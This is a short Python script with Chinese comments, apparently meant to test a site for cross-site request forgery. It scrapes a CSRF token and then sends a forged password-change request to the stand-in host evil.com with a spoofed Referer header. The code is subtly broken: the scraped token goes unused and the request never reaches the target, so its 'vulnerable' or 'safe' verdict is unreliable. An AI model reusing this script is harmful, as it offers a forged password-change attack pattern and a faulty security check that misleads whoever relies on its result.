import requests
import re

# 检测目标 URL
target_url = "http://example.com/change_password.php"
# 攻击者构造的恶意请求，其中的 token 参数由攻击者替换成自己的
malicious_request = "http://evil.com/change_password.php?new_password=hacker123&token=attacker_token"

# 发送原始请求，获取 CSRF token
response = requests.get(target_url)
csrf_token = re.findall(r'<input type="hidden" name="csrf_token" value="(\w+)">', response.text)[0]

# 发送恶意请求，模拟 CSRF 攻击
response = requests.get(malicious_request, headers={"Referer": target_url})

# 分析响应，判断是否成功修改密码
if response.status_code == 200 and "Password updated successfully" in response.text:
    print("[!] CSRF vulnerability found in " + target_url)
else:
    print("[+] Target seems to be safe from CSRF attacks")
